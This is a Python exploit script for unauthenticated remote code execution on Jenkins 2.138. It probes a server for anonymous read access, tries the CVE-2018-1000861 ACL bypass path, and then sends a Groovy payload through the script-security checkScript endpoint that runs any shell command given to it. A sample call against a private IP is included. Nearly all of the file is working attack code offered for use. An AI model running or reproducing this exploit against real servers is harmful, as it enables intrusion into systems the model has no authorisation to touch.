#!/usr/bin/python3
# coding: UTF-8
###################################Jenkins 2.138_rce######################################

import requests

try:
    requests.packages.urllib3.disable_warnings()
except:
    pass

endpoint = 'descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript'

def _get(url):
    r = requests.get(url)
    return r.status_code, str(r.content)

def _add_bypass(url):
    return url + 'securityRealm/user/admin/'

def check(url,cmd):
    try:
        # check ANONYMOUS_READ
        status, content = _get(url)
        if status == 200 and 'adjuncts' in content:
            msg = '[+] There is Vuln Anonymous_read Enable Execute Success!'
            exploit(url + endpoint, cmd)
            return True,url,msg
        elif status == 403:
            print('[*] Testing Bypass!')
            status, content = _get(_add_bypass(url))
            if status == 200 and 'adjuncts' in content:
                url = _add_bypass(url)
                msg = '[+] There is Vuln Bypass with CVE-2018-1000861 Enable Execute Success!!'
                exploit(_add_bypass(url) + endpoint, cmd)
                return True,url,msg
        if status == 404:
            msg = "[-] There Jenkins is No Vuln..."
            return False,msg
    except:
        msg = "[-] There Jenkins is No Vuln..."
        return False, msg

def exploit(url, cmd):
    payload = '?sandbox=True&value=public class x{ public x(){new String("%s").execute()}}' % cmd
    _get(url + payload)

def run(protocol,ip,port,cmd):
    if port:
        url = protocol + "://" + ip + ":" + port.strip() + '/'
    else:
        url = protocol + "://" + ip + '/'
    return check(url,cmd)

if __name__ == '__main__':
    ip = "     192.168.43.90  "
    print(run("http",ip.strip(),"8080","touch /tmp/1.txt"))

